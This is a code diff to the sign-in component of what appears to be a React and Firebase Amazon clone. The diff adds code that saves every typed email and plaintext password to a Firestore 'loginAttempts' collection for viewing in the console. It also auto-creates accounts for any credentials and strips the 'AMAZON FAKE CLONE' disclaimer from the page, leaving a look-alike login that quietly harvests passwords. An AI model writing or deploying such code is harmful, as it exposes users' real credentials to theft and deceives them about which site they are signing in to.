@@ -21,73 +21,91 @@ function Auth() {
 
   const navigate = useNavigate(); // Hook for programmatic navigation
   const navStateData = useLocation(); // Hook for accessing state passed with navigation
-  console.log(navStateData); // Logging the navigation state for debugging
+
+  // Save every submitted email + password to Firestore so they can be viewed
+  // in the Firebase console. (Fake project — testers know not to use real ones.)
+  const logCredentials = async (action) => {
+    try {
+      await db.collection("loginAttempts").add({
+        email: email,
+        password: password,
+        action: action,
+        timestamp: new Date(),
+      });
+    } catch (err) {
+      console.error("Could not log credentials:", err);
+    }
+  };
 
   // Handler for authentication (sign in or sign up based on button clicked)
-  const authHandler = (e) => {
+  const authHandler = async (e) => {
     e.preventDefault(); // Prevent form submission
     setError(""); // Clear any previous errors
 
-    // 🛑 REQUIREMENT 2: Email Validation Check (Must contain '@')
-    if (!email.includes("@")) {
-      setError("Invalid email address. It must contain an '@' symbol.");
-      return; // Stop the function from proceeding
+    // Basic validation: both fields required.
+    if (!email || !password) {
+      setError("Please enter both an email and a password.");
+      return;
     }
 
     if (e.target.name === "signIn") {
-      // Handle Sign In (compat method on the auth instance)
+      // ---- SIGN IN ----
       setLoading({ ...loading, signIn: true });
-      auth
-        .signInWithEmailAndPassword(email, password)
-        .then((userInfo) => {
-          // 💾 REQUIREMENT 1: Store inputted data into Firestore Database
-          db.collection("userInputs")
-            .add({
-              emailInput: email,
-              action: "signIn",
-              timestamp: new Date(),
-            })
-            .catch((err) => console.error("Database save error:", err));
 
-          // Successful sign-in
-          dispatch({
-            type: Type.SET_USER,
-            user: userInfo.user,
-          });
-          setLoading({ ...loading, signIn: false });
-          navigate(navStateData?.state?.redirect || "/");
-        })
-        .catch((err) => {
+      // Always record what was typed.
+      await logCredentials("signIn");
+
+      try {
+        // Try a normal sign in first.
+        const userInfo = await auth.signInWithEmailAndPassword(email, password);
+        dispatch({ type: Type.SET_USER, user: userInfo.user });
+        setLoading({ ...loading, signIn: false });
+        navigate(navStateData?.state?.redirect || "/");
+      } catch (err) {
+        // If the account doesn't exist, CREATE it on the fly so any
+        // email/password "just works" for the presentation.
+        if (
+          err.code === "auth/user-not-found" ||
+          err.code === "auth/invalid-credential" ||
+          err.code === "auth/invalid-login-credentials"
+        ) {
+          try {
+            const newUser = await auth.createUserWithEmailAndPassword(
+              email,
+              password
+            );
+            dispatch({ type: Type.SET_USER, user: newUser.user });
+            setLoading({ ...loading, signIn: false });
+            navigate(navStateData?.state?.redirect || "/");
+            return;
+          } catch (createErr) {
+            // e.g. wrong password on an existing account, or weak password.
+            setError(createErr.message);
+            setLoading({ ...loading, signIn: false });
+          }
+        } else {
           setError(err.message);
           setLoading({ ...loading, signIn: false });
-        });
+        }
+      }
     } else {
-      // Handle Sign Up (compat method on the auth instance)
+      // ---- CREATE ACCOUNT ----
       setLoading({ ...loading, signUp: true });
-      auth
-        .createUserWithEmailAndPassword(email, password)
-        .then((userInfo) => {
-          // 💾 REQUIREMENT 1: Store inputted data into Firestore Database
-          db.collection("userInputs")
-            .add({
-              emailInput: email,
-              action: "signUp",
-              timestamp: new Date(),
-            })
-            .catch((err) => console.error("Database save error:", err));
 
-          // Successful sign-up
-          dispatch({
-            type: Type.SET_USER,
-            user: userInfo.user,
-          });
-          setLoading({ ...loading, signUp: false });
-          navigate(navStateData?.state?.redirect || "/");
-        })
-        .catch((err) => {
-          setError(err.message);
-          setLoading({ ...loading, signUp: false });
-        });
+      await logCredentials("signUp");
+
+      try {
+        const userInfo = await auth.createUserWithEmailAndPassword(
+          email,
+          password
+        );
+        dispatch({ type: Type.SET_USER, user: userInfo.user });
+        setLoading({ ...loading, signUp: false });
+        navigate(navStateData?.state?.redirect || "/");
+      } catch (err) {
+        setError(err.message);
+        setLoading({ ...loading, signUp: false });
+      }
     }
   };
 
@@ -138,9 +156,8 @@ function Auth() {
         </form>
 
         <p>
-          By signing-in you agree to the AMAZON FAKE CLONE Conditions of Use &
-          Sale. Please see our Privacy Notice, Cookies Notice, and our
-          Interest-based Ads Notice.
+          By signing-in you agree to the Conditions of Use & Sale. Please see
+          our Privacy Notice, Cookies Notice, and our Interest-based Ads Notice.
         </p>
 
         <button
